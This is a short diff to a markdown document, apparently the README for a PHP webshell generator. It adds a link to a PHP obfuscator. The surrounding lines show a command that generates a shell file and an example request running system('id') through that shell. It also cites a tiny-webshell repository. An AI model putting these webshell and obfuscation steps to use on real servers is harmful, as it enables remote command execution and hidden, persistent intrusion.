@@ -132,6 +132,10 @@ python3 xorshell.py -m GET -p cmd -o asuka.php
 http://localhost:8000/asuka.php?cmd=system('id');
 ```
 
+### PHP Obfuscator
+
+* [https://www.gaijin.at/en/tools/php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator)
+
 ### Reference
 
 * [https://github.com/bayufedra/Tiny-PHP-Webshell](https://github.com/bayufedra/Tiny-PHP-Webshell)
